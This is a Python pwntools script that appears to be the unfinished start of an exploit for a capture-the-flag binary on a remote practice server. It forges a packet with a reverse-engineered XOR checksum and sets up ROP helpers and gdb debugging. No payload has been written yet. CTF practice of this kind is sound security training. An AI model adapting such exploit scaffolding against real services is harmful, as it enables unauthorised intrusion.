from pwn import *

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "/lib/x86_64-linux-gnu/libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node4.buuoj.cn", 29096)
    libc_path = "./libc.so.6"
    libc, roplibc = ELF(libc_path), ROP(libc_path)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    #pause()


def submit():
    pass


def add(data):
    io.sendafter("4. Quit.\n", b"1".ljust(8, b"\x00"))
    sleep(0.01)

    payload = p16(30318) + p16(10423) #+0 +2
    payload += p32(1) #+4 +6
    payload += p32(1) #+8 +10
    payload += p16(6) + p16(1) #+12 +14
    payload += p16(0) + p16(0) #+16 +18
    payload += p16(1) + p16(0xffff) #+20 +22
    payload += data
    payload = payload.ljust(0x1000, b"\x00")

    checksum = check(payload)
    payload = payload[:16] + p16(checksum) + payload[18:]

    io.send(payload)


def deete():
    pass


def check(data):
    f = "afekpiehdaaf"
    v5 = 0

    for i in range(6):
        byte = f[2 * i:2 * (i + 1)]
        v = ord(byte[0]) * 256 + ord(byte[1])
        v5 = v5 ^ v

    for i in range(0x800):
        if i != 8:
            byte = data[2 * i:2 * (i + 1)]
            v = byte[0] + byte[1] * 256
            v5 = v5 ^ v

    return v5


ddebug("b *0x40163B")
add(b"aaaa")

io.interactive()
